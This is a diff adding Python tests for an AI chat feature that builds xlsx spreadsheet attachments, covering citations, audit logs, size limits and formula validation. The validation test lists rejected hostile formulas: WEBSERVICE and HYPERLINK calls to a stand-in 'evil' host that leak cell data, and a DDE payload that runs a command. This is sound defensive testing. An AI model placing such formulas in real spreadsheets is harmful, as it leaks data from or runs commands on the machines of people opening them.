@@ -12,8 +12,9 @@ from sqlalchemy import func, select, update
 
 from app import storage
 from app.ai import extract
+from app.ai.provider import ToolCall
 from app.config import settings
-from app.models import AiAttachment, AiSession
+from app.models import AiAttachment, AiSession, AuditEvent
 from app.routers import ai
 
 from .conftest import Users, csrf, login
@@ -355,3 +356,137 @@ async def test_upload_quota_nul_and_audit(
     assert r.status_code == 422 and r.json()["detail"].startswith("첨부 보관 한도를 넘었습니다")
     assert await app_db.scalar(select(func.count(AiAttachment.id))) == 1
     ai._upload_calls.clear()
+
+
+@pytest.mark.usefixtures("minio_bucket")
+async def test_chat_creates_spreadsheet_as_attachment(
+    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
+) -> None:
+    """README 55: 모델이 create_spreadsheet 를 부르면 xlsx 첨부가 생기고 파일 카드 번호로 각주가 달린다. 틀린 표는
+    is_error, 한 답변에 하나, 팩트체커에는 도구가 없다."""
+
+    class Maker(SearchingProvider):
+        async def stream(self, *, system, messages, max_tokens=None, tools=None, tool_choice=None):
+            SearchingProvider.turns.append(messages)
+            SearchingProvider.tools_seen.append(tools)
+            last = messages[-1]["content"]
+            if not (isinstance(last, list) and last and last[0].get("type") == "tool_result"):
+                yield self.calls(
+                    ToolCall(
+                        id="bad", name="create_spreadsheet", input={"name": "x", "sheets": []}
+                    ),
+                    ToolCall(
+                        id="ok",
+                        name="create_spreadsheet",
+                        input={
+                            "name": "월별 이익/정리 "
+                            + "가" * 70
+                            + ".XLSX",  # 긴 한글 이름 — 확장자가 잘리지 않는다
+                            "sheets": [
+                                {
+                                    "title": "이익",
+                                    "rows": [
+                                        ["월", "매출", "비용", "이익"],
+                                        ["1월", 120, 80, "=B2-C2"],
+                                    ],
+                                }
+                            ],
+                        },
+                    ),
+                    ToolCall(
+                        id="again",
+                        name="create_spreadsheet",
+                        input={"name": "y", "sheets": [{"rows": [[1]]}]},
+                    ),
+                )
+                return
+            yield "만들었습니다[[1]]."
+
+    _reset(app, Maker)
+    share_scope(monkeypatch, app_db)
+    SearchingProvider.turns, SearchingProvider.tools_seen = [], []
+    ai._ai_calls.clear()
+    await login(client, "sujin@zenith.co.kr")
+    ev = await _chat(client, "월별 이익을 엑셀로 만들어 줘")
+    assert [t["name"] for t in SearchingProvider.tools_seen[0]] == [
+        "search_knowledge",
+        "read_document",
+        "create_spreadsheet",
+    ]
+    assert ("status", {"text": "파일을 만드는 중"}) in ev
+    results = {r["tool_use_id"]: r for r in SearchingProvider.turns[-1][-1]["content"]}
+    assert (
+        results["bad"]["is_error"] is True and "표 모양이 틀렸습니다" in results["bad"]["content"]
+    )
+    assert "is_error" not in results["ok"] and results["ok"]["content"].startswith(
+        "[1] 《월별 이익_정리 가가"
+    )
+    assert results["again"]["is_error"] is True and "하나만" in results["again"]["content"]
+    citations = next(d for e, d in ev if e == "citations")
+    assert (
+        len(citations) == 1 and citations[0]["type"] == "file" and citations[0]["path"] == "AI 생성"
+    )
+    att = await app_db.scalar(select(AiAttachment).where(AiAttachment.user_id == users.member.id))
+    assert att is not None and citations[0]["to"] == f"/api/ai/attachments/{att.id}"
+    assert att.name.endswith(".xlsx") and len(att.name.encode()) <= 155
+    assert att.name.startswith("월별 이익_정리 가가") and att.content_type == ai.XLSX_TYPE
+    # 다음 질문에서 첨부로 읽힌다 — 수식 셀은 엑셀이 계산한 적이 없어 평문에선 빈칸(openpyxl 은 캐시 값을 안 만든다)
+    assert "## 이익" in att.text and "1월 | 120 | 80 |" in att.text
+    # 내려받기 — 올린 사람만, 진짜 xlsx(수식·머리글 굵게)
+    r = await client.get(f"/api/ai/attachments/{att.id}")
+    # 내려받기는 늘 octet-stream(README 51) — 이름은 Content-Disposition 으로
+    assert r.status_code == 200 and "xlsx" in r.headers["content-disposition"]
+    wb = openpyxl.load_workbook(io.BytesIO(r.content))
+    ws = wb["이익"]
+    assert ws["D2"].value == "=B2-C2" and ws["A1"].font.bold and ws["B2"].value == 120
+    ev2 = await app_db.scalar(select(AuditEvent).where(AuditEvent.kind == "ai.file_create"))
+    assert ev2 is not None and ev2.actor_id == users.member.id and ev2.target_id == att.id
+    assert ev2.detail["ext"] == "xlsx" and len(ev2.detail["sha"]) == 16
+    # 팩트체커에는 파일 만들기 도구가 없다
+    SearchingProvider.tools_seen = []
+    await client.post("/api/ai/check", json={"text": "연차는 15일"}, headers=csrf(client))
+    assert "create_spreadsheet" not in [t["name"] for t in SearchingProvider.tools_seen[0]]
+
+
+def test_build_xlsx_limits() -> None:
+    from app.ai.make import MAX_CELLS, MAX_COLS, MAX_ROWS, MAX_SHEETS, BadSpec, build_xlsx
+
+    for bad in (
+        None,
+        [],
+        [{"rows": "x"}],
+        [{"rows": [[1] * (MAX_COLS + 1)]}],
+        [{"rows": [[1]] * (MAX_ROWS + 1)}],
+        [{"rows": [[1] * MAX_COLS] * (MAX_CELLS // MAX_COLS + 1)}],
+        [{"rows": [[1]]}] * (MAX_SHEETS + 1),
+        [{"rows": [[{"a": 1}]]}],
+        [{"rows": [["x" * 1001]]}],
+        [{"rows": [[float("inf")]]}],
+        [{"rows": [[]]}],  # 빈 표
+        [{"title": "A", "rows": [[1]]}, {"title": "a", "rows": [[1]]}],
+        # 수식 — 문자열·외부 참조·허용 밖 함수(보안 리뷰: 셀 값 반출·DDE)
+        [{"rows": [['=WEBSERVICE("https://evil/?"&B2)']]}],
+        [{"rows": [['=HYPERLINK("https://evil","x")']]}],
+        [{"rows": [["=cmd|' /C calc'!A0"]]}],
+        [{"rows": [["=[book.xlsx]Sheet1!A1"]]}],
+        [{"rows": [["=INDIRECT(A1)"]]}],
+    ):
+        with pytest.raises(BadSpec):
+            build_xlsx(bad)
+    data = build_xlsx(
+        [
+            {
+                "title": "'매출[1]/2'",
+                "rows": [["a", None, True, 1.5], ["b\x00c\ud800", "=SUM(A1:A2)+ROUND(B2,1)"]],
+            },
+            {"title": "History", "rows": [[1]]},
+        ]
+    )
+    wb = openpyxl.load_workbook(io.BytesIO(data))
+    assert wb.sheetnames == ["매출_1__2", "History_"]
+    ws = wb["매출_1__2"]
+    assert (
+        ws["A2"].value == "bc"
+        and ws["B2"].value == "=SUM(A1:A2)+ROUND(B2,1)"
+        and ws["A1"].font.bold
+    )
